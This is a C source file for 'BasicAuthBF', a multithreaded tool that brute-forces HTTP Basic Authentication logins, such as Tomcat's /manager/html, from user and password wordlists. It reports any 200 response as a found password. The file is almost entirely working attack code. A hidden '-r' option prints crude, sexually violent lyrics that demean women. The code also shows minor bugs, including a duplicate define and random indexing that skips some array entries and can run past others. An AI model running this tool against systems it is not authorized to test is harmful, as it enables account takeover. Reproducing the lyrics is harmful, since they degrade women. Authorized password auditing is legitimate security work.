#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <ctype.h>

/*Pa' que lo goces con el requetuning*/
#define f1 (1+rand())%4
#define f2 (1+rand())%4
#define f3 (1+rand())%4
#define f3 (1+rand())%4
#define f4 (1+rand())%4
#define f5 (1+rand())%4

/***************************************************************/
/***************************************************************
			BasicAuthBF multithreaded  v0.4 (Jun 2025)
				(a.k.a. Tomcat BruteForcer multithreaded)

	Compile with -> gcc BasicAuthBF.c -lpthread -o BasicAuthBF
	
	CHANGES:
			- Fixing Buffer Overflow in strcpy(path, optarg);

	License GNU/GPLv3
	by @dan1t0 Abr 2012 jdanimartinez[AT]gmail[DOT]com

	Usage: 
	./BasicAuthBF -i IP [-p PORT=8080] -U users_file -P passwords_file -z login_path [-t N_THREADS=8]

***************************************************************
***************************************************************/


/***********************
	Special Thanks to
		@Nighterman
		@AloneInTheShell
		@Pancake
************************/


/*
	Debugging
	gcc BasicAuthBF.c -ggdb -lpthread -o BasicAuthBF
	gdb --args ./BasicAuthBF -i 127.0.0.1 -p 8080 -U user.txt -P pass.txt -t 9
		r		run
		bt		backtrace
*/


#define BUFF_INPUT 256
#define BUFF_REQ 2048
#define BUFF_RESPON 1024 
#define THREADS_DEFULT 8
#define PORT_DEFAULT 8080


FILE *fd_user, *fd_password;
char *ip = NULL;
int port = PORT_DEFAULT;
int password_totales = 0;
int pass_relative =0;
char path[BUFF_INPUT];



void chop(char *s) {
	//thanks @pancake for do more POSIX my source
	int ch, len = strlen (s);
	do ch = s[--len];
	while (ch == '\r' || ch == '\n');
	s[len+1] = 0;
}


void help () {
	printf ("\tError. Usage: ./BasicAuthBF -i IP [-p PORT=8080] -z path -U users_file -P passwords_file [-t N_THREADS=8]\n\n");
	printf ("Example: ./BasicAuthBF -i 127.0.0.1 -U user.txt -P pass.txt -z /manager/html -t 9\n");
	printf ("\tpath example tomcat: /manager/html\n\n");
	printf ("If you want compose reggeton execute ./BasicAuthBF -r and enjoy\n\n");
    exit (1);	
}


void requeton() {

    char * mierder[5][6] = {
    "Mami","yo quiero","castigarte","duro","hasta que salga el sol","sin miedo",
    "Gata","vamos a","azotarte","rapido","toda la noche","sin anestesia",
    "Perra","yo voy a","cogerte","lento","hasta el amanecer","en el piso",
    "Zorra","yo quiero","encenderte","suave","hasta mañana","contra la pared",
    "Chica","yo vengo a","darte","fuerte","todo el dia","sin compromiso",
    };

    srand((unsigned)time(NULL));

    printf ("%s %s %s %s %s\n",
        mierder[f1][0],mierder[f2][1],mierder[f3][2],mierder[f4][3],mierder[f5][4]);
    exit(1);
}


int open_connection(in_addr_t addr, uint16_t port) {
    int conn;
    struct sockaddr_in sockaddr;

    sockaddr.sin_addr.s_addr = addr;
    sockaddr.sin_port = port;
    sockaddr.sin_family = AF_INET;

    conn = socket(AF_INET, SOCK_STREAM, 0);
    if (conn < 0) {
        perror("socket(): ");
        return -1;
    }

    if (connect(conn, (struct sockaddr *) &sockaddr, sizeof (struct sockaddr))) {
        close(conn);
        perror("connect(): ");
        return -1;
    }

    return conn;
}

static const char base64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static void encode_base_64(char* src, char* dest, int max_len) {
    int n, l, i;
    l = strlen(src);
    max_len = (max_len - 1) / 4;
    for (i = 0; i < max_len; i++, src += 3, l -= 3) {
        switch (l) {
            case 0:
                break;
            case 1:
                n = src[0] << 16;
                *dest++ = base64[(n >> 18) & 077];
                *dest++ = base64[(n >> 12) & 077];
                *dest++ = '=';
                *dest++ = '=';
                break;
            case 2:
                n = src[0] << 16 | src[1] << 8;
                *dest++ = base64[(n >> 18) & 077];
                *dest++ = base64[(n >> 12) & 077];
                *dest++ = base64[(n >> 6) & 077];
                *dest++ = '=';
                break;
            default:
                n = src[0] << 16 | src[1] << 8 | src[2];
                *dest++ = base64[(n >> 18) & 077];
                *dest++ = base64[(n >> 12) & 077];
                *dest++ = base64[(n >> 6) & 077];
                *dest++ = base64[n & 077];
        }
        if (l < 3) break;
    }
    *dest++ = 0;
}

int test_user (char *user, char *password, char *path) {
    int sockfd;
    char buff_request[BUFF_REQ];
    char buff_response[BUFF_RESPON];
    char login[BUFF_INPUT]; 
    char login_cod[BUFF_INPUT * 2];
    
    bzero(login_cod, BUFF_INPUT * 2);
    bzero(buff_request, BUFF_REQ);
    bzero(buff_response, BUFF_RESPON);
    bzero(login, BUFF_INPUT);
    
    sockfd= open_connection(inet_addr(ip), htons(port));


    /*CREAMOS EL REQUEST*/
    snprintf(login, BUFF_INPUT, "%s:%s", user, password);
    encode_base_64(login, login_cod, (BUFF_INPUT * 3));

	snprintf(buff_request, BUFF_REQ, \
    	"HEAD %s HTTP/1.0\r\n" \
		"Authorization: Basic %s\r\n\r\n",path, login_cod);

    /*ESCRIBIMOS EN EL SOCKET Y LEEMOS LA RESPUESTA*/
    write(sockfd, buff_request, strlen(buff_request));
    read(sockfd, buff_response, BUFF_RESPON);
    
    /*CERRAMOS LA CONEXION*/
    close(sockfd);

	/*COMPROBAMOS RESPUESTA DEL SERVIDOR*/    
    if (memcmp("200", buff_response + 9, 3)==0 ) {
    	printf("\nYEAH!! PASWORD FOUND\nBasicAuthBF v0.03 by @dan1t0\n- User:     %s\n- Password: %s\n\n",user, password);
    	exit(0);	
    }
    	
}

int CuentaLineas (char *archivo)
{
    char linea[BUFF_INPUT];
    FILE *fp;
    int n_linea =0;
	
	if ((fp = fopen(archivo, "r")) == NULL) {
        perror("Error opening file");
        exit(-1);
    }

    while(NULL != fgets(linea, BUFF_INPUT,fp)) {
        n_linea= n_linea +1;
    }
    fclose(fp);
    
    return n_linea;
}

void *tworker (void *parametro)
{
	char password[BUFF_INPUT];
	bzero(password, BUFF_INPUT);
	
	while (NULL != fgets(password, BUFF_INPUT, fd_password)) {
		chop (password);
		test_user((char *)parametro, password, path); 
	}	
}


	
int main (int argc, char **argv) {
	
	int n_hilos= THREADS_DEFULT;
	int x, res;
	char user[BUFF_INPUT];
	int usuarios_totales = 0;
	int users_cont = 0;
	
    char *hilos_text = NULL;
    char *user_file = NULL;
    char *password_file = NULL;
    int index;
    int c;
    opterr = 0;
	int ok = 0;	//chapuza de las frescas
	
    while ((c = getopt (argc, argv, "i:z:p:U:P:t:hr")) != -1)
        switch (c) {
            case 'r':
                requeton();
                break;
            case 'i':
                ip = optarg;
                break;
			case 'z':
                if (snprintf(path, sizeof(path), "%s", optarg) >= sizeof(path)) {
                    fprintf(stderr, "Error: Path too long\n");
                    help();
                }
                ok = 1;
                break;
            case 'p':
                port = atoi (optarg);
                break;
            case 'U':
                user_file = optarg;
                break;
            case 'P':
                password_file = optarg;
                break;
            case 't':
                n_hilos = atoi (optarg);	
                break;        
            case 'h':
                help();
                break;                 
            case '?':
                if (optopt == 'c') {
                    fprintf (stderr, "Option -%c requires an argument.\n", optopt);
                    help();
                }
                else if (isprint (optopt)) {
                    fprintf (stderr, "Unknown option `-%c'.\n", optopt);
                    help();
                }
                else {
                    fprintf (stderr, "Unknown option character `\\x%x'.\n", optopt);
                	help();
                }
            
                return 1;
            default:
                abort ();
        }
    if (user_file == NULL) {
    	printf("Error. User file not include\n");
    	help ();
    }
    else if (password_file == NULL) {
    	printf("Error. Password file not include\n");
    	help ();
    }
    else if (ok == 0) {
    	printf("Error. You need include the path\n");
    	help ();
    }
    else if (ip == NULL) {
    	printf("Error. Enter an IP address\n");
    	help ();
    }

     
    for (index = optind; index < argc; index++)
        printf ("Non-option argument %s\n", argv[index]);
    		

		
    pthread_t thread[n_hilos];
    
    usuarios_totales = CuentaLineas(user_file);
    password_totales = CuentaLineas(password_file);
    
    if ((fd_user = fopen(user_file, "r")) == NULL) {
        perror("Error opening file user");
        exit(-1);
    }

    if ((fd_password = fopen(password_file, "r")) == NULL) {
        perror("Error opening file password");
        exit(-1);
    }  
   
	
	printf ("BasicAuthBF v0.03 by @dan1t0\n- There are %d possible users and %d password\n\n", \
			usuarios_totales,password_totales);
	
	while (NULL != fgets(user, BUFF_INPUT, fd_user)) {
		chop (user);
        users_cont = users_cont + 1;
        printf("- Testing with user: %s (%d of %d)\n",user,users_cont,usuarios_totales);
		
		for (x=0; x<n_hilos; x++) {        
        	/* Create thread */
        	
        	res = pthread_create(&thread[x], NULL, tworker, (void*)user);
        	if (res != 0)
        	{
        	    printf("Error creating thread pool\n");
      	      	perror("pthread_create");
        	    exit(-1);
        	}       
    	}
    	
    	for (x=0; x<n_hilos; x++)
    		pthread_join(thread[x], NULL);
    		
    	rewind(fd_password);
    }
    printf ("%s","UPSS!! PASSWORD NOT FOUND - BasicAuthBF v0.03\n");
}
